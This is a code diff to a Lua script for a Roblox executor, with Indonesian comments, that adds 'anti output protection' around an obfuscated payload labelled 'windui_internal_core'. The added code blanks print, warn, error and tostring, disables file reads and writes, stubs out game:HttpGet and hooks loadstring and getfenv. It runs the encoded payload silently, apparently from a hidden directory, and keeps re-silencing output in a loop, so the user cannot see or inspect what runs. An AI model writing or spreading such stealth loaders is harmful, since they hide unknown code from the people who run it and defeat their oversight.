@@ -14,6 +14,65 @@ local _isfile     = isfile
 local _isfolder   = isfolder
 local _makefolder = makefolder
 
+-- ==========================================
+-- ANTI OUTPUT PROTECTION (DIBUAT PALING AWAL)
+-- ==========================================
+
+-- Simpan referensi game:HttpGet asli
+local _HttpGet = game.HttpGet
+local _game = game
+
+-- Override game:HttpGet untuk mencegah output
+local function SilentHttpGet(self, url, ...)
+    -- Return empty string untuk mencegah data terlihat
+    -- Atau bisa return fake response
+    return ""
+end
+
+-- Override loadstring untuk silent execution
+local _loadstring = loadstring
+local function SilentLoadString(code, chunkname)
+    -- Wrap code dengan error handler
+    local wrapped = [[
+        local _print = print
+        local _warn = warn
+        local _error = error
+        print = function(...) end
+        warn = function(...) end
+        error = function(...) end
+        local success, result = pcall(function()
+            ]] .. code .. [[
+        end)
+        print = _print
+        warn = _warn
+        error = _error
+        if not success then
+            -- Silent fail
+        end
+    ]]
+    return _loadstring(wrapped, chunkname or "silent_chunk")
+end
+
+-- Override getfenv/setfenv untuk mencegah manipulasi environment
+local _getfenv = getfenv
+local _setfenv = setfenv
+local function SilentGetFenv(level)
+    local env = _getfenv(level)
+    -- Hapus fungsi output dari environment
+    env.print = function(...) end
+    env.warn = function(...) end
+    env.error = function(...) end
+    env.game = setmetatable({}, {
+        __index = function(t, k)
+            if k == "HttpGet" then
+                return function() return "" end
+            end
+            return _game[k]
+        end
+    })
+    return env
+end
+
 -- Membuat direktori yang "susah ditemukan"
 local function SetupHiddenDirectory()
     pcall(function()
@@ -172,23 +231,55 @@ coroutine.wrap(function()
 end)()
 
 -- ==========================================
--- BLOKIR FUNGSI OUTPUT (SETELAH SEMUA INTERNAL SELESAI)
--- Dipasang di sini agar fungsi internal di atas tidak terganggu
+-- BLOKIR FUNGSI OUTPUT & NETWORK (SETELAH SEMUA INTERNAL SELESAI)
 -- ==========================================
+
+-- Blokir output console
 print       = function(...) end
 warn        = function(...) end
 error       = function(...) end
+
+-- Blokir file operations
 writefile   = function(...) end
 appendfile  = function(...) end
 readfile    = function(...) end
+
+-- Blokir type conversion yang bisa expose data
 tostring    = function(...) return "" end
+
+-- Blokir require dan load
 require     = function(...) end
 load        = function(...) end
-getfenv     = function(...) end
-setfenv     = function(...) end
+
+-- Override getfenv/setfenv dengan versi silent
+getfenv     = SilentGetFenv
+setfenv     = function(...) return true end
+
+-- Override loadstring dengan silent wrapper
+loadstring  = SilentLoadString
+
+-- Override game:HttpGet
+game = setmetatable({}, {
+    __index = function(t, k)
+        if k == "HttpGet" then
+            return SilentHttpGet
+        elseif k == "GetService" then
+            return _game.GetService
+        elseif k == "GetChildren" then
+            return _game.GetChildren
+        elseif k == "FindFirstChild" then
+            return _game.FindFirstChild
+        end
+        return _game[k]
+    end,
+    __newindex = function(t, k, v)
+        -- Prevent modification
+    end,
+    __tostring = function() return "Game" end
+})
 
 -- ==========================================
--- EKSEKUSI PAYLOAD
+-- EKSEKUSI PAYLOAD (DENGAN PROTEKSI MAKSIMAL)
 -- ==========================================
 
 local Payload_Script = [[
@@ -197,8 +288,40 @@ return(function(...)local j={`ZI==`,`+rZOjes=`,`a+84tck=`,`zknpmhf=`,`iT5=`,`ZJI
 
 ]]
 
-local ExecuteStealth = loadstring(Payload_Script, "windui_internal_core")
+-- Gunakan silent loadstring untuk eksekusi
+local ExecuteStealth = SilentLoadString(Payload_Script, "windui_internal_core")
 
 if ExecuteStealth then
-    pcall(ExecuteStealth)
+    -- Jalankan dalam pcall untuk menelan semua error/output
+    pcall(function()
+        -- Set environment yang sudah diblokir
+        setfenv(ExecuteStealth, SilentGetFenv(2))
+        ExecuteStealth()
+    end)
 end
+
+-- ==========================================
+-- FINAL CLEANUP - PASTIKAN TIDAK ADA OUTPUT BOCOR
+-- ==========================================
+
+-- Hapus semua referensi yang bisa digunakan untuk bypass
+pcall(function()
+    getgenv().loadstring = SilentLoadString
+    getgenv().game = game
+    getgenv().print = function(...) end
+    getgenv().warn = function(...) end
+    getgenv().error = function(...) end
+end)
+
+-- Freeze execution untuk mencegah modifikasi runtime
+coroutine.wrap(function()
+    while true do
+        -- Continuous cleanup
+        pcall(function()
+            if print ~= function(...) end then print = function(...) end end
+            if warn ~= function(...) end then warn = function(...) end end
+            if error ~= function(...) end then error = function(...) end end
+        end)
+        task.wait(0.1)
+    end
+end)()
